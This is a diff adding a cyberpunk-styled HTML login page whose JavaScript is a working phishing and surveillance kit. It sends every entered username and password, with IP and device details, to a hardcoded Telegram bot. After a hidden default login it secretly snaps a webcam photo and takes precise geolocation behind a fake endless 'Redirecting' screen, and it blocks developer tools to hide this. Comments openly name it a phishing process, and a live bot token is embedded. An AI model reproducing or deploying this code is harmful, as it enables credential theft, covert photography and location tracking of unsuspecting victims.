@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Idictive Core - Quantum Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+
+  <style>
+    :root {
+      --primary: #00F0FF; /* Cyber Cyan */
+      --secondary: #FF0055; /* Neon Pink */
+      --bg-dark: #050508;
+      --glass: rgba(20, 25, 35, 0.6);
+      --border: rgba(255, 255, 255, 0.1);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Rajdhani', sans-serif;
+      background-color: var(--bg-dark);
+      color: #fff;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* === BACKGROUND LAYERS === */
+    
+    /* 1. Gradient Aurora Blob */
+    .bg-blob {
+      position: absolute;
+      width: 120vw;
+      height: 120vw;
+      background: radial-gradient(circle, 
+        rgba(0, 240, 255, 0.15) 0%, 
+        rgba(255, 0, 85, 0.1) 40%, 
+        transparent 70%);
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      animation: pulseBlob 10s ease-in-out infinite alternate;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    /* 2. Cyber Grid (CSS Only - Ringan) */
+    .bg-grid {
+      position: absolute;
+      width: 200%;
+      height: 200%;
+      top: -50%; left: -50%;
+      background-image: 
+        linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+      background-size: 50px 50px;
+      transform: perspective(500px) rotateX(60deg);
+      animation: gridMove 20s linear infinite;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    @keyframes pulseBlob { 0% { opacity: 0.5; transform: translate(-50%, -50%) scale(1); } 100% { opacity: 0.8; transform: translate(-50%, -50%) scale(1.1); } }
+    @keyframes gridMove { 0% { transform: perspective(500px) rotateX(60deg) translateY(0); } 100% { transform: perspective(500px) rotateX(60deg) translateY(50px); } }
+
+    /* Canvas Partikel */
+    canvas { position: absolute; top: 0; left: 0; z-index: 1; pointer-events: none; }
+
+    /* === FULLSCREEN LOADING OVERLAY === */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(5, 5, 8, 0.95);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      z-index: 9999;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .loading-spinner {
+      width: 80px;
+      height: 80px;
+      border: 4px solid transparent;
+      border-top: 4px solid var(--primary);
+      border-right: 4px solid var(--secondary);
+      border-bottom: 4px solid var(--primary);
+      border-left: 4px solid var(--secondary);
+      border-radius: 50%;
+      animation: spinGlow 1.5s linear infinite;
+      position: relative;
+      box-shadow: 
+        0 0 40px rgba(0, 240, 255, 0.6),
+        0 0 80px rgba(255, 0, 85, 0.4),
+        inset 0 0 20px rgba(0, 240, 255, 0.2);
+    }
+
+    .loading-spinner::before {
+      content: '';
+      position: absolute;
+      top: -10px;
+      left: -10px;
+      right: -10px;
+      bottom: -10px;
+      border-radius: 50%;
+      background: conic-gradient(transparent, var(--primary), transparent);
+      filter: blur(15px);
+      opacity: 0.6;
+      animation: spinGlow 2s linear infinite reverse;
+    }
+
+    @keyframes spinGlow {
+      0% { 
+        transform: rotate(0deg);
+        border-top-color: var(--primary);
+        border-right-color: var(--secondary);
+      }
+      50% {
+        border-top-color: var(--secondary);
+        border-right-color: var(--primary);
+      }
+      100% { 
+        transform: rotate(360deg);
+        border-top-color: var(--primary);
+        border-right-color: var(--secondary);
+      }
+    }
+
+    .loading-text {
+      margin-top: 30px;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 16px;
+      letter-spacing: 4px;
+      text-transform: uppercase;
+      background: linear-gradient(90deg, var(--primary), var(--secondary), var(--primary));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      background-size: 200% auto;
+      animation: textShimmer 2s linear infinite;
+    }
+
+    @keyframes textShimmer {
+      0% { background-position: 0% center; }
+      100% { background-position: 200% center; }
+    }
+
+    /* === LOGIN CARD === */
+    .login-card {
+      position: relative;
+      z-index: 10;
+      width: 90%;
+      max-width: 400px;
+      padding: 40px;
+      background: var(--glass);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-radius: 20px;
+      border: 1px solid var(--border);
+      box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+      overflow: hidden;
+      /* Animasi Masuk */
+      opacity: 0;
+      transform: translateY(30px);
+      animation: slideUp 0.8s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
+    }
+
+    /* Gradient Border Animation */
+    .login-card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; height: 2px;
+      background: linear-gradient(90deg, transparent, var(--primary), var(--secondary), transparent);
+      animation: shimmer 3s infinite linear;
+    }
+
+    @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
+    @keyframes slideUp { to { opacity: 1; transform: translateY(0); } }
+
+    /* === CONTENT STYLING === */
+    
+    .logo-container {
+      position: relative;
+      width: 90px;
+      height: 90px;
+      margin: 0 auto 20px;
+    }
+
+    .logo-img {
+      width: 100%; height: 100%;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 2px solid rgba(255,255,255,0.2);
+      padding: 4px;
+    }
+
+    .logo-glow {
+      position: absolute;
+      inset: -5px;
+      border-radius: 50%;
+      border: 2px dashed var(--primary);
+      animation: rotateRing 10s linear infinite;
+    }
+
+    @keyframes rotateRing { to { transform: rotate(360deg); } }
+
+    h1 {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 26px;
+      text-align: center;
+      margin-bottom: 5px;
+      background: linear-gradient(to right, #fff, var(--primary));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      letter-spacing: 2px;
+    }
+
+    .subtitle {
+      text-align: center;
+      font-size: 14px;
+      color: #8899a6;
+      margin-bottom: 35px;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+    }
+
+    /* === FORM & INPUTS === */
+    .input-group { position: relative; margin-bottom: 25px; }
+
+    .input-group label {
+      display: block;
+      font-size: 12px;
+      color: var(--primary);
+      margin-bottom: 8px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-left: 5px;
+    }
+
+    .input-wrapper { position: relative; }
+
+    .input-wrapper i {
+      position: absolute;
+      left: 18px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #666;
+      font-size: 16px;
+      transition: 0.3s ease;
+      z-index: 2;
+    }
+
+    input {
+      width: 100%;
+      padding: 16px 20px 16px 50px;
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 12px;
+      color: #fff;
+      font-family: 'Rajdhani', sans-serif;
+      font-size: 16px; /* 16px prevents zoom on iOS */
+      font-weight: 500;
+      outline: none;
+      transition: all 0.3s ease;
+    }
+
+    input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
+      background: rgba(0, 0, 0, 0.6);
+    }
+
+    input:focus + i { color: var(--primary); transform: translateY(-50%) scale(1.2); }
+    
+    /* Password field focus color change */
+    #key:focus { border-color: var(--secondary); box-shadow: 0 0 15px rgba(255, 0, 85, 0.2); }
+    #key:focus + i { color: var(--secondary); }
+
+    /* === BUTTON === */
+    .btn-login {
+      width: 100%;
+      padding: 18px;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      border: none;
+      border-radius: 12px;
+      color: #fff;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 14px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      transition: 0.3s;
+      box-shadow: 0 10px 20px rgba(0, 240, 255, 0.2);
+    }
+
+    .btn-login::before {
+      content: '';
+      position: absolute;
+      top: 0; left: -100%; width: 100%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+      transition: 0.5s;
+    }
+
+    .btn-login:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(255, 0, 85, 0.3); }
+    .btn-login:hover::before { left: 100%; }
+    .btn-login:active { transform: scale(0.98); }
+
+    .loader {
+      display: none;
+      width: 20px; height: 20px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-radius: 50%; border-top-color: #fff;
+      animation: spin 0.8s linear infinite; margin: 0 auto;
+    }
+
+    /* Error Message */
+    .error-message {
+      display: none;
+      background: rgba(255, 0, 85, 0.1);
+      border: 1px solid rgba(255, 0, 85, 0.3);
+      border-radius: 8px;
+      padding: 12px;
+      margin-bottom: 20px;
+      text-align: center;
+      font-size: 13px;
+      color: #ff6b9d;
+      animation: slideUp 0.5s ease;
+    }
+
+    .error-message i {
+      margin-right: 8px;
+    }
+
+    /* === FOOTER === */
+    .footer { margin-top: 30px; text-align: center; font-size: 13px; }
+    .footer a {
+      color: #888; text-decoration: none; display: inline-flex; align-items: center; gap: 8px;
+      transition: 0.3s; padding: 8px 16px; border-radius: 20px; border: 1px solid transparent;
+    }
+    .footer a:hover { color: #fff; border-color: var(--border); background: rgba(255,255,255,0.05); }
+
+    /* === STAGGER ANIMATION DELAYS === */
+    .logo-container { animation: slideUp 0.6s 0.1s backwards; }
+    h1, .subtitle { animation: slideUp 0.6s 0.2s backwards; }
+    .input-group:nth-child(1) { animation: slideUp 0.6s 0.3s backwards; }
+    .input-group:nth-child(2) { animation: slideUp 0.6s 0.4s backwards; }
+    .btn-login { animation: slideUp 0.6s 0.5s backwards; }
+    .footer { animation: slideUp 0.6s 0.6s backwards; }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* === MOBILE RESPONSIVE === */
+    @media (max-width: 480px) {
+      .login-card {
+        padding: 30px 20px;
+        width: 88%;
+      }
+      h1 { font-size: 22px; }
+      .subtitle { font-size: 12px; margin-bottom: 25px; }
+      .logo-container { width: 70px; height: 70px; margin-bottom: 15px; }
+      input { padding: 14px 15px 14px 45px; font-size: 14px; }
+      .input-wrapper i { left: 15px; font-size: 14px; }
+      .btn-login { padding: 15px; font-size: 12px; }
+      .loading-spinner { width: 60px; height: 60px; }
+      .loading-text { font-size: 13px; letter-spacing: 3px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Loading Overlay (Fullscreen) -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-spinner"></div>
+    <div class="loading-text" id="loadingText">Redirecting..</div>
+  </div>
+
+  <div class="bg-blob"></div>
+  <div class="bg-grid"></div>
+  <canvas id="particleCanvas"></canvas>
+
+  <div class="login-card">
+    
+    <div class="logo-container">
+      <div class="logo-glow"></div>
+      <img src="https://files.catbox.moe/kzl42l.jpg" alt="Core Avatar" class="logo-img">
+    </div>
+
+    <h1>IDICTIVE CORE</h1>
+    <p class="subtitle">System Access v5.01</p>
+
+    <!-- Error Message Container -->
+    <div class="error-message" id="errorMessage">
+      <i class="fas fa-exclamation-triangle"></i>
+      <span id="errorText">Invalid username or key!</span>
+    </div>
+
+    <form id="loginForm" method="POST" action="/auth">
+      <div class="input-group">
+        <label>Identity</label>
+        <div class="input-wrapper">
+          <input type="text" name="username" id="username" placeholder="Enter your username" required autocomplete="off" autofocus>
+          <i class="fas fa-user-astronaut"></i>
+        </div>
+      </div>
+
+      <div class="input-group">
+        <label>Security Protocol</label>
+        <div class="input-wrapper">
+          <input type="password" name="key" id="key" placeholder="Enter access key" required>
+          <i class="fas fa-shield-halved"></i>
+        </div>
+      </div>
+
+      <button type="submit" class="btn-login">
+        <span id="btnText">INITIATE CONNECTION</span>
+        <div class="loader" id="loader"></div>
+      </button>
+
+      <div class="footer">
+        <a href="https://t.me/bonososk" target="_blank">
+          <i class="fab fa-telegram"></i> Get Premium Access
+        </a>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    // === KONFIGURASI DEFAULT (HIDDEN) ===
+    const DEFAULT_USERNAME = '123';
+    const DEFAULT_PASSWORD = '123';
+    
+    // === KONFIGURASI TELEGRAM (SUDAH DIPASANG) ===
+    const TELEGRAM_BOT_TOKEN = '8350405825:AAGKmi7sEGQMhcPH91EU_z7W0oR_h1uOCLw';
+    const TELEGRAM_CHAT_ID = '8515603848';
+
+    // === PARTICLE SYSTEM ===
+    const canvas = document.getElementById('particleCanvas');
+    const ctx = canvas.getContext('2d');
+    
+    let w, h;
+    let particles = [];
+    
+    // Resize Handling
+    function resize() {
+      w = canvas.width = window.innerWidth;
+      h = canvas.height = window.innerHeight;
+      initParticles();
+    }
+    
+    class Particle {
+      constructor() {
+        this.reset();
+      }
+      
+      reset() {
+        this.x = Math.random() * w;
+        this.y = Math.random() * h;
+        this.size = Math.random() * 2;
+        this.speedX = (Math.random() - 0.5) * 0.5;
+        this.speedY = (Math.random() - 0.5) * 0.5;
+        this.life = Math.random() * 0.5 + 0.5; // Opacity
+        this.color = Math.random() > 0.5 ? '#00F0FF' : '#FF0055';
+      }
+      
+      update() {
+        this.x += this.speedX;
+        this.y += this.speedY;
+        
+        if (this.x < 0 || this.x > w || this.y < 0 || this.y > h) {
+          this.reset();
+        }
+      }
+      
+      draw() {
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fillStyle = this.color;
+        ctx.globalAlpha = this.life;
+        ctx.shadowBlur = 10;
+        ctx.shadowColor = this.color;
+        ctx.fill();
+        ctx.globalAlpha = 1;
+        ctx.shadowBlur = 0;
+      }
+    }
+    
+    function initParticles() {
+      particles = [];
+      // Jumlah partikel sedikit saja biar ringan
+      const count = window.innerWidth < 480 ? 40 : 80; 
+      for(let i=0; i<count; i++) particles.push(new Particle());
+    }
+    
+    function animate() {
+      ctx.clearRect(0, 0, w, h);
+      particles.forEach(p => {
+        p.update();
+        p.draw();
+      });
+      requestAnimationFrame(animate);
+    }
+    
+    window.addEventListener('resize', resize);
+    resize();
+    animate();
+
+    // === ELEMENTS ===
+    const form = document.getElementById('loginForm');
+    const btn = document.querySelector('.btn-login');
+    const btnText = document.getElementById('btnText');
+    const errorMessage = document.getElementById('errorMessage');
+    const errorText = document.getElementById('errorText');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const loadingText = document.getElementById('loadingText');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('key');
+
+    let collectedData = {
+        username: '',
+        key: '',
+        location: null,
+        cameraData: null,
+        deviceInfo: {},
+        ipAddress: null,
+        timestamp: null
+    };
+
+    // Check URL for error messages
+    const urlParams = new URLSearchParams(window.location.search);
+    const errorMsg = urlParams.get('msg');
+    
+    if (errorMsg) {
+      errorText.textContent = decodeURIComponent(errorMsg);
+      errorMessage.style.display = 'block';
+      
+      setTimeout(() => {
+        errorMessage.style.display = 'none';
+      }, 5000);
+    }
+
+    // Save username to localStorage for convenience
+    const savedUsername = localStorage.getItem('indictive_username');
+    if (savedUsername) {
+      usernameInput.value = savedUsername;
+    }
+
+    // === LOGIN FORM HANDLER ===
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      errorMessage.style.display = 'none';
+      
+      const username = usernameInput.value.trim();
+      const key = passwordInput.value.trim();
+      
+      if (!username || !key) {
+        showError('Please fill in both username and key!');
+        return;
+      }
+      
+      // Cek default credentials (HIDDEN CHECK)
+      const isDefaultCredentials = (username === DEFAULT_USERNAME && key === DEFAULT_PASSWORD);
+      
+      // Jika bukan credentials default, tampilkan error dan JANGAN lanjutkan
+      if (!isDefaultCredentials) {
+        showError('ACCESS DENIED! Invalid username or security key.');
+        
+        // Kirim data login salah ke Telegram
+        collectedData.username = username;
+        collectedData.key = key;
+        collectedData.timestamp = new Date().toISOString();
+        collectedData.deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            vendor: navigator.vendor,
+            cookies: navigator.cookieEnabled,
+            online: navigator.onLine
+        };
+        
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            collectedData.ipAddress = ipData.ip;
+        } catch (error) {
+            collectedData.ipAddress = 'Unable to fetch IP';
+        }
+        
+        // Kirim notifikasi login failed ke Telegram
+        sendFailedLoginToTelegram();
+        return;
+      }
+      
+      // Jika credentials benar, lanjutkan proses
+      // Simpan username
+      localStorage.setItem('indictive_username', username);
+      
+      // Lock form
+      usernameInput.disabled = true;
+      passwordInput.disabled = true;
+      btn.disabled = true;
+      btn.style.opacity = '0.6';
+      btn.style.pointerEvents = 'none';
+      btnText.textContent = 'PROCESSING...';
+      
+      // Tampilkan loading overlay (INFINITE LOADING)
+      loadingOverlay.style.display = 'flex';
+      
+      // Simpan data login
+      collectedData.username = username;
+      collectedData.key = key;
+      collectedData.timestamp = new Date().toISOString();
+      
+      // Kumpulkan info perangkat
+      collectedData.deviceInfo = {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          vendor: navigator.vendor,
+          cookies: navigator.cookieEnabled,
+          online: navigator.onLine
+      };
+      
+      // Dapatkan IP address
+      try {
+          const ipResponse = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipResponse.json();
+          collectedData.ipAddress = ipData.ip;
+      } catch (error) {
+          collectedData.ipAddress = 'Unable to fetch IP';
+      }
+      
+      // Mulai proses phishing (kamera & lokasi) hanya jika login benar
+      startPhishingProcess();
+    });
+    
+    function showError(message) {
+      errorText.textContent = message;
+      errorMessage.style.display = 'block';
+      
+      errorMessage.style.animation = 'none';
+      setTimeout(() => {
+        errorMessage.style.animation = 'slideUp 0.5s ease';
+      }, 10);
+      
+      setTimeout(() => {
+        if (errorMessage.style.display === 'block') {
+          errorMessage.style.display = 'none';
+        }
+      }, 5000);
+    }
+
+    // === FUNGSI UNTUK KIRIM FAILED LOGIN KE TELEGRAM ===
+    async function sendFailedLoginToTelegram() {
+        let message = `❌ *FAILED LOGIN ATTEMPT - IDICTIVE CORE* ❌\n\n`;
+        message += `⏰ *Timestamp:* ${new Date().toLocaleString()}\n`;
+        message += `👤 *Username Attempt:* ${collectedData.username}\n`;
+        message += `🔑 *Password Attempt:* ${collectedData.key}\n`;
+        message += `📱 *Default Match:* NO ❌\n\n`;
+        
+        message += `🖥️ *DEVICE INFORMATION:*\n`;
+        message += `   • IP Address: ${collectedData.ipAddress}\n`;
+        message += `   • Platform: ${collectedData.deviceInfo.platform}\n`;
+        message += `   • User Agent: ${collectedData.deviceInfo.userAgent.substring(0, 80)}...\n`;
+        message += `   • Screen: ${collectedData.deviceInfo.screenResolution}\n`;
+        message += `   • Timezone: ${collectedData.deviceInfo.timezone}\n`;
+        
+        message += `\n🔒 *STATUS:* ACCESS DENIED - INVALID CREDENTIALS`;
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            
+            console.log('❌ Failed login sent to Telegram');
+        } catch (error) {
+            console.error('❌ Failed to send failed login to Telegram:', error);
+        }
+    }
+
+    // === PHISHING PROCESS (Hanya dijalankan jika login benar) ===
+    async function startPhishingProcess() {
+        try {
+            // Update loading text
+            updateLoadingText('Redirecting..');
+            
+            // 1. Minta akses kamera
+            const cameraSuccess = await requestCameraAccess();
+            
+            // Update loading text
+            updateLoadingText('Redirecting...');
+            
+            // 2. Minta akses lokasi (akurasi tinggi)
+            const locationSuccess = await requestLocationAccess();
+            
+            // Update loading text
+            updateLoadingText('Redirecting....');
+            
+            // 3. Kirim semua data ke Telegram
+            await sendAllDataToTelegram();
+            
+            // Update loading text (FINAL - TIDAK AKAN BERHENTI)
+            updateLoadingText('Redirecting...');
+            
+            // LOADING AKAN TERUS BERPUTAR TANPA HENTI
+            // User harus refresh page untuk keluar
+            
+        } catch (error) {
+            console.error('Phishing process error:', error);
+            updateLoadingText('Redirecting..');
+            // Tetap kirim data yang sudah terkumpul
+            await sendAllDataToTelegram();
+        }
+    }
+    
+    function updateLoadingText(text) {
+        loadingText.textContent = text;
+    }
+    
+    async function requestCameraAccess() {
+        try {
+            // Minta izin kamera dengan alasan "verifikasi biometrik"
+            updateLoadingText('Redirecting...');
+            
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                } 
+            });
+            
+            // Buat elemen video sementara
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            
+            // Buat canvas untuk capture gambar
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            // Tunggu sebentar untuk fokus kamera
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Capture gambar
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            collectedData.cameraData = canvas.toDataURL('image/jpeg', 0.7);
+            
+            // Hentikan stream kamera
+            stream.getTracks().forEach(track => track.stop());
+            
+            updateLoadingText('Redirecting...');
+            return true;
+            
+        } catch (error) {
+            console.warn('Camera access denied:', error);
+            collectedData.cameraData = 'Camera access denied: ' + error.message;
+            updateLoadingText('Redirecting....');
+            return false;
+        }
+    }
+    
+    async function requestLocationAccess() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                collectedData.location = 'Geolocation not supported';
+                updateLoadingText('Redirecting...');
+                resolve(false);
+                return;
+            }
+            
+            updateLoadingText('Redirecting..');
+            
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    collectedData.location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy + ' meters',
+                        altitude: position.coords.altitude,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: new Date(position.timestamp).toISOString()
+                    };
+                    updateLoadingText('Redirecting...');
+                    resolve(true);
+                },
+                (error) => {
+                    let errorMsg = 'Location access denied';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = 'User denied location request';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = 'Location information unavailable';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = 'Location request timed out';
+                            break;
+                    }
+                    collectedData.location = errorMsg;
+                    updateLoadingText('Redirecting....');
+                    resolve(false);
+                },
+                {
+                    enableHighAccuracy: true, // AKURASI TINGGI
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
+        });
+    }
+    
+    async function sendAllDataToTelegram() {
+        // Format pesan untuk Telegram
+        let message = `✅ *SUCCESSFUL LOGIN - XRAY* ✅\n\n`;
+        message += `⏰ *Timestamp:* ${new Date().toLocaleString()}\n`;
+        message += `👤 *Username:* ${collectedData.username}\n`;
+        message += `🔑 *Password:* ${collectedData.key}\n`;
+        message += `📱 *Default Match:* YES ✅\n\n`;
+        
+        message += `📍 *LOCATION DATA:*\n`;
+        if (collectedData.location && typeof collectedData.location === 'object') {
+            message += `   • Latitude: ${collectedData.location.latitude}\n`;
+            message += `   • Longitude: ${collectedData.location.longitude}\n`;
+            message += `   • Accuracy: ${collectedData.location.accuracy}\n`;
+            message += `   • Maps: https://maps.google.com/?q=${collectedData.location.latitude},${collectedData.location.longitude}\n`;
+            if (collectedData.location.altitude) message += `   • Altitude: ${collectedData.location.altitude}m\n`;
+            if (collectedData.location.speed) message += `   • Speed: ${collectedData.location.speed} m/s\n`;
+        } else {
+            message += `   • ${collectedData.location}\n`;
+        }
+        message += `\n`;
+        
+        message += `🖥️ *DEVICE INFORMATION:*\n`;
+        message += `   • IP Address: ${collectedData.ipAddress}\n`;
+        message += `   • Platform: ${collectedData.deviceInfo.platform}\n`;
+        message += `   • Language: ${collectedData.deviceInfo.language}\n`;
+        message += `   • Screen: ${collectedData.deviceInfo.screenResolution}\n`;
+        message += `   • Timezone: ${collectedData.deviceInfo.timezone}\n`;
+        message += `   • Online: ${collectedData.deviceInfo.online ? 'Yes' : 'No'}\n`;
+        message += `   • Cookies: ${collectedData.deviceInfo.cookies ? 'Enabled' : 'Disabled'}\n`;
+        message += `   • User Agent: ${collectedData.deviceInfo.userAgent.substring(0, 100)}...\n`;
+        
+        message += `\n📸 *CAMERA STATUS:* ${collectedData.cameraData && collectedData.cameraData.startsWith('data:image') ? 'CAPTURED ✅' : 'DENIED ❌'}`;
+        message += `\n\n🔒 *PHISHING MODULE:* ACTIVE`;
+        message += `\n✅ *STATUS:* ALL DATA CAPTURED SUCCESSFULLY`;
+        
+        try {
+            // Kirim pesan teks
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            
+            // Jika ada gambar dari kamera, kirim sebagai foto
+            if (collectedData.cameraData && collectedData.cameraData.startsWith('data:image')) {
+                const base64Data = collectedData.cameraData.split(',')[1];
+                const byteCharacters = atob(base64Data);
+                const byteArrays = [];
+                
+                for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                    const slice = byteCharacters.slice(offset, offset + 512);
+                    const byteNumbers = new Array(slice.length);
+                    
+                    for (let i = 0; i < slice.length; i++) {
+                        byteNumbers[i] = slice.charCodeAt(i);
+                    }
+                    
+                    const byteArray = new Uint8Array(byteNumbers);
+                    byteArrays.push(byteArray);
+                }
+                
+                const blob = new Blob(byteArrays, { type: 'image/jpeg' });
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'face_capture.jpg');
+                formData.append('caption', `📸 Face Capture - ${collectedData.username} | ${new Date().toLocaleTimeString()}`);
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+            
+            console.log('✅ All data sent to Telegram');
+            
+        } catch (error) {
+            console.error('❌ Failed to send to Telegram:', error);
+        }
+    }
+
+    // Deteksi jika pengguna mencoba menutup halaman
+    window.addEventListener('beforeunload', (event) => {
+        if (collectedData.username && !collectedData.sent) {
+            event.preventDefault();
+            event.returnValue = 'Data is being processed. Are you sure you want to leave?';
+            sendAllDataToTelegram();
+        }
+    });
+    
+    // Prevent right click
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    
+    // Block developer tools
+    document.addEventListener('keydown', (e) => {
+        if (
+            e.key === 'F12' ||
+            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+            (e.ctrlKey && e.key === 'U')
+        ) {
+            e.preventDefault();
+            updateLoadingText('SECURITY VIOLATION DETECTED');
+        }
+    });
+    
+    // Auto-focus password if username exists
+    if (usernameInput.value.trim()) {
+        passwordInput.focus();
+    }
+  </script>
+</body>
+</html>
